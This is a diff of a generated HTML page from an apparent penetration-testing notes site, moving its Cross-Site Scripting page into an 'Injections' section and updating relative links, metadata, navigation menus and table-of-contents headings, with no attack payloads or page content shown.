@@ -8,16 +8,16 @@
       
       
       
-        <link rel="canonical" href="https://jacobh.io/%F0%9F%8C%90%20Web%20Application/Cross-Site%20Scripting%20%28XSS%29/">
+        <link rel="canonical" href="https://jacobh.io/%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/">
       
       
-        <link rel="prev" href="../API/">
+        <link rel="prev" href="../Command%20Injection/">
       
       
-        <link rel="next" href="../Directory%20Fuzzing/">
+        <link rel="next" href="../External%20Entity%20Injection%20%28XXE%29/">
       
       
-      <link rel="icon" href="../../assets/favicon.ico">
+      <link rel="icon" href="../../../assets/favicon.ico">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
     
     
@@ -26,10 +26,10 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.342714a4.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -48,7 +48,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -61,7 +61,7 @@
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🌐 Web Application/Cross-Site Scripting (XSS).png" >
+        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🌐 Web Application/Injections/Cross-Site Scripting (XSS).png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -69,7 +69,7 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%8C%90%20Web%20Application/Cross-Site%20Scripting%20%28XSS%29/" >
+        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
@@ -77,7 +77,7 @@
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🌐 Web Application/Cross-Site Scripting (XSS).png" >
+        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🌐 Web Application/Injections/Cross-Site Scripting (XSS).png" >
       
     
     
@@ -100,7 +100,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#dom-xss" class="md-skip">
+        <a href="#identify" class="md-skip">
           Skip to content
         </a>
       
@@ -114,9 +114,9 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="jacobh.io" class="md-header__button md-logo" aria-label="jacobh.io" data-md-component="logo">
+    <a href="../../.." title="jacobh.io" class="md-header__button md-logo" aria-label="jacobh.io" data-md-component="logo">
       
-  <img src="../../assets/favicon.ico" alt="logo">
+  <img src="../../../assets/favicon.ico" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -244,7 +244,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         
   
   
@@ -263,7 +263,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%F0%9F%90%89%20Kali%20Setup/" class="md-tabs__link">
+      <a href="../../../%F0%9F%90%89%20Kali%20Setup/" class="md-tabs__link">
         
   
   
@@ -291,7 +291,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-tabs__link">
+        <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-tabs__link">
           
   
   
@@ -316,7 +316,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="../" class="md-tabs__link">
+        <a href="../../" class="md-tabs__link">
           
   
   
@@ -336,7 +336,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../%F0%9F%A4%93%20writeups/" class="md-tabs__link">
+        <a href="../../../%F0%9F%A4%93%20writeups/" class="md-tabs__link">
           
   
   
@@ -363,7 +363,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-tabs__link">
+        <a href="../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-tabs__link">
           
   
   
@@ -386,7 +386,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../%F0%9F%AA%9F%20Active%20Directory/" class="md-tabs__link">
+        <a href="../../../%F0%9F%AA%9F%20Active%20Directory/" class="md-tabs__link">
           
   
   
@@ -420,9 +420,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="jacobh.io" class="md-nav__button md-logo" aria-label="jacobh.io" data-md-component="logo">
+    <a href="../../.." title="jacobh.io" class="md-nav__button md-logo" aria-label="jacobh.io" data-md-component="logo">
       
-  <img src="../../assets/favicon.ico" alt="logo">
+  <img src="../../../assets/favicon.ico" alt="logo">
 
     </a>
     jacobh.io
@@ -449,7 +449,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -471,7 +471,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%90%89%20Kali%20Setup/" class="md-nav__link">
+      <a href="../../../%F0%9F%90%89%20Kali%20Setup/" class="md-nav__link">
         
   
   
@@ -575,7 +575,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-nav__link">
         
   
   
@@ -598,7 +598,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/" class="md-nav__link">
         
   
   
@@ -621,7 +621,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Credential%20%26%20Identity%20Attacks/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Credential%20%26%20Identity%20Attacks/" class="md-nav__link">
         
   
   
@@ -644,7 +644,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/" class="md-nav__link">
         
   
   
@@ -667,7 +667,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Phishing%20via%20SSO%20Device%20Codes/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Phishing%20via%20SSO%20Device%20Codes/" class="md-nav__link">
         
   
   
@@ -690,7 +690,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/" class="md-nav__link">
         
   
   
@@ -713,7 +713,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Serverless%20Services%20Exploitation/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Serverless%20Services%20Exploitation/" class="md-nav__link">
         
   
   
@@ -736,7 +736,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/" class="md-nav__link">
         
   
   
@@ -759,7 +759,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/" class="md-nav__link">
+      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/" class="md-nav__link">
         
   
   
@@ -843,7 +843,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../" class="md-nav__link">
+      <a href="../../" class="md-nav__link">
         
   
   
@@ -866,12 +866,662 @@
   
   
     <li class="md-nav__item">
-      <a href="../API/" class="md-nav__link">
+      <a href="../../API/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
     API
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Directory%20Fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Directory Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Google%20Dorks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Google Dorks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20File%20Uploads/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Insecure File Uploads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Parameter%20Fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Parameter Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Verb%20Tampering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Verb Tampering
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Application%20Firewall/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Application Firewall
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_9" id="__nav_4_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Access Control
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_9">
+            <span class="md-nav__icon md-icon"></span>
+            Access Control
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Access%20Control/-%20Getting%20Started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+      Getting Started
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Broken Function Level Access (BLFA)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Access%20Control/Broken%20Object%20Level%20Access%20%28BOLA%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Broken Object Level Access (BOLA)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Insecure Direct Object Reference (IDOR)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_10" id="__nav_4_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Authentication
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_10">
+            <span class="md-nav__icon md-icon"></span>
+            Authentication
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Authentication/-%20Getting%20Started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+      Getting Started
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Authentication/Brute%20Forcing%20Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brute Forcing Authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Authentication/Multi-Factor%20Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Multi Factor Authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Authentication/Rate%20Limiting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Rate Limiting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Authentication/Session%20Tokens/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Session Tokens
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_11" id="__nav_4_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    File Inclusion
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_11">
+            <span class="md-nav__icon md-icon"></span>
+            File Inclusion
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/Directory%20Traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Directory Traversal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/Filter%20Bypasses/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Filter Bypasses
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Local File Inclusion (LFI)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/Remote%20File%20Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Remote File Inclusion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_12" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_12" id="__nav_4_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injections
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_12_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_12">
+            <span class="md-nav__icon md-icon"></span>
+            Injections
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command%20Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Command Injection
     
   </span>
   
@@ -935,6 +1585,57 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#htlm-tag-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTLM Tag Context
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#javascript-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Javascript context
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general" class="md-nav__link">
+    <span class="md-ellipsis">
+      General
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="General">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#quickly-test-for-unfiltered-tags" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quickly test for unfiltered tags
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#dom-xss" class="md-nav__link">
     <span class="md-ellipsis">
       DOM XSS
@@ -945,7 +1646,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#identify" class="md-nav__link">
+  <a href="#identify_1" class="md-nav__link">
     <span class="md-ellipsis">
       Identify
     </span>
@@ -965,6 +1666,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Stored">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#automated-with-dom-invader" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automated with DOM Invader
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
     </ul>
@@ -983,12 +1699,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../Directory%20Fuzzing/" class="md-nav__link">
+      <a href="../External%20Entity%20Injection%20%28XXE%29/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Directory Fuzzing
+    External Entity Injection (XXE)
     
   </span>
   
@@ -1006,12 +1722,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../Google%20Dorks/" class="md-nav__link">
+      <a href="../NoSQL%20Injection/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Google Dorks
+    NoSQL Injection
     
   </span>
   
@@ -1029,12 +1745,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../Insecure%20File%20Uploads/" class="md-nav__link">
+      <a href="../SQL%20Injection/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Insecure File Uploads
+    SQL Injection
     
   </span>
   
@@ -1052,496 +1768,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../Parameter%20Fuzzing/" class="md-nav__link">
+      <a href="../Server-Side%20Template%20Injection%20%28SSTI%29/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Parameter Fuzzing
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Verb%20Tampering/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Verb Tampering
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Web%20Application%20Firewall/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Web Application Firewall
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-    
-      
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_10" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_10" id="__nav_4_10_label" tabindex="0">
-            
-  
-  
-  <span class="md-ellipsis">
-    Access Control
-    
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_10_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_10">
-            <span class="md-nav__icon md-icon"></span>
-            Access Control
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Access%20Control/-%20Getting%20Started/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-      Getting Started
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Broken Function Level Access (BLFA)
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Access%20Control/Broken%20Object%20Level%20Access%20%28BOLA%29/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Broken Object Level Access (BOLA)
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Insecure Direct Object Reference (IDOR)
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-    
-      
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_11" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_11" id="__nav_4_11_label" tabindex="0">
-            
-  
-  
-  <span class="md-ellipsis">
-    Authentication
-    
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_11_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_11">
-            <span class="md-nav__icon md-icon"></span>
-            Authentication
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Authentication/-%20Getting%20Started/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-      Getting Started
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Authentication/Brute%20Forcing%20Authentication/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Brute Forcing Authentication
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Authentication/Multi-Factor%20Authentication/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Multi Factor Authentication
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Authentication/Rate%20Limiting/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Rate Limiting
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Authentication/Session%20Tokens/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Session Tokens
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-    
-      
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_12" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_12" id="__nav_4_12_label" tabindex="0">
-            
-  
-  
-  <span class="md-ellipsis">
-    File Inclusion
-    
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_12_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_12">
-            <span class="md-nav__icon md-icon"></span>
-            File Inclusion
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../File%20Inclusion/Directory%20Traversal/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Directory Traversal
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../File%20Inclusion/Filter%20Bypasses/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Filter Bypasses
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Local File Inclusion (LFI)
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../File%20Inclusion/Remote%20File%20Inclusion/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Remote File Inclusion
+    Server Side Template Injection (SSTI)
     
   </span>
   
@@ -1586,7 +1818,7 @@
   
   
   <span class="md-ellipsis">
-    Injections
+    Request Forgery
     
   </span>
   
@@ -1596,170 +1828,6 @@
         
         <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_13_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4_13">
-            <span class="md-nav__icon md-icon"></span>
-            Injections
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Injections/Command%20Injection/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Command Injection
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Injections/External%20Entity%20Injection%20%28XXE%29/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    External Entity Injection (XXE)
-    
-  </span>
-  
